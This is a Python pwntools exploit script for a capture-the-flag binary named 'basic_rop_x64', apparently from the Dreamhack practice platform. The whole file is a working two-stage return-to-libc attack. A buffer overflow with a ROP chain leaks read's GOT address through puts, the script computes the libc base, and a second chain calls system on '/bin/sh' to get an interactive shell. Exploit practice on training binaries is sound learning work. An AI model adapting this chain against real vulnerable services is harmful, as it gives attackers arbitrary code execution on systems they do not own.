from pwn import *

def slog(func_name, func_addr): return success(" : ".join([func_name, hex(func_addr)]))
p = process('./basic_rop_x64')
#p = remote("host3.dreamhack.games",13239)
#gdb.attach(p)
e = ELF("./basic_rop_x64")
# libc = ELF("./libc.so.6")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

pause()

puts_plt = e.plt["puts"]
read_got = e.got["read"]
main = e.symbols["main"]

slog("puts_plt",puts_plt)
slog("read_got",read_got)
slog("main",main)

poprdiret = 0x0000000000400883
binsh_offset = 0x19604f

payload = b''
payload += b'a'*0x40 + b'b'*0x8
payload += p64(poprdiret)
payload += p64(read_got)
payload += p64(puts_plt)
payload += p64(main)
p.send(payload)


p.recvuntil('a'*0x40)
a = p.recv(6)
print(a)
read_addr = u64(a + b'\x00'*2)
print(f"read addr : {hex(read_addr)}")
libc_base = read_addr - libc.symbols["read"]
system = libc_base + libc.symbols["system"]
binsh = libc_base + binsh_offset

payload = b''
payload += b'a'*0x40 + b'b'*0x8
payload += p64(poprdiret)
payload += p64(binsh)
payload += p64(0x0000000000400819)
payload += p64(system)
print(payload)

p.send(payload)
p.interactive()


